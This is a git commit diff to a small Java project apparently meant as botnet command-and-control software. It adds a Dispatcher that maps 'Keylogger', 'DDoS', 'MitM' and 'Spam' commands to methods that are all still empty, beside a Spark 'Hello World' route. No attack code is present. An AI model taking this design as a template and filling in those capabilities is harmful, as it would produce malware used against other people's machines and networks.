a0689850658995a7b0d3cd0dee53270441905739
sethRait <sethrait95@gmail.com>
2016-12-22 13:40:45 -0500

    Dispatcher schema

--- src/main/java/CommandAndControl.java
+++ src/main/java/CommandAndControl.java
@@ -1,9 +1,11 @@
+import spark.Spark;
+
 import static spark.Spark.*;
 
 public class CommandAndControl {
     public static void main(String[] args) {
         get("/hello", (req, res) -> "Hello World");
         System.out.println("DSF");
-        stop();
+        Spark.stop();
     }
 }
--- src/main/java/Dispatcher.java
+++ src/main/java/Dispatcher.java
@@ -1,5 +1,48 @@
+import java.util.HashMap;
+import java.util.Map;
+
 /**
  * Created by seth on 12/21/16.
  */
+
+enum Status {WAITING, RUNNING, DONE, ERROR};
+
 public class Dispatcher {
+    private Map<String, Runnable> func;
+    private Status status;
+
+    public Dispatcher() {
+        func = new HashMap<>();
+        func.put("Keylogger", this::Keylogger);
+        func.put("DDoS", this::DDos);
+        func.put("MitM", this::MitM);
+        func.put("Spam", this::Spam);
+        func.put("Query", this::Query);
+        status = Status.DONE;
+    }
+
+    private void Query() {
+    }
+
+    private void Spam() {
+    }
+
+    private void MitM() {
+    }
+
+    private void DDos() {
+    }
+
+    private void Keylogger() {
+    }
+
+    /**
+     * Execute the given command on a new process.
+     * @param args the command and list of arguments.  args[0] is the command to execute and
+     *             args[1...args.length] are the arguments supplied to the command.
+     * @return The status of the requested operation.
+     */
+    public Status Dispatch(String[] args) {
+        return status;
+    }
 }
